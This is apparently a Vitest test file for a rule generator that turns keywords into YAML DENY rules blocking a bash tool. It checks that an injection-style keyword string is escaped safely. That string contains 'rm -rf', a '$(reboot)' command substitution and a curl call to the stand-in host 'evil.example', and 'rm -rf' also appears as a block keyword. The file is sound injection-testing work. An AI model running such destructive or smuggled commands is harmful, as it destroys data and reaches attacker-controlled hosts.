import { describe, it, expect } from "vitest";
import * as yaml from "js-yaml";
import { buildBlockRule, dumpRuleYaml } from "../src/rule-gen.js";

describe("rule-gen (P2-2 YAML escaping)", () => {
  it("builds a block rule with the expected shape", () => {
    const rule = buildBlockRule("bash", "rm -rf");
    expect(rule.name).toBe("SEC-002-block-bash");
    expect(rule.then).toBe("DENY");
    expect(rule.ring).toBe(0);
    expect((rule.when as { conditions: unknown[] }).conditions).toHaveLength(2);
  });

  it("escapes keywords with YAML metacharacters (no injection / no structural break)", () => {
    const evil = 'rm -rf " $(reboot) : \\\n && curl http://evil.example';
    const rule = buildBlockRule("bash", evil);
    const yamlText = dumpRuleYaml(rule);

    // The emitted YAML must parse back to the SAME value — not break structure.
    const parsed = yaml.load(yamlText) as Array<Record<string, unknown>>;
    expect(parsed).toHaveLength(1);

    const conditions = (parsed[0].when as { conditions: Array<{ value: string }> }).conditions;
    expect(conditions[1].value).toBe(evil);
    expect(parsed[0].then).toBe("DENY");
  });

  it("keeps a plain keyword unquoted but valid", () => {
    const yamlText = dumpRuleYaml(buildBlockRule("bash", "rm -rf"));
    const parsed = yaml.load(yamlText) as Array<Record<string, unknown>>;
    expect((parsed[0].when as { conditions: Array<{ value: string }> }).conditions[1].value).toBe(
      "rm -rf",
    );
  });
});
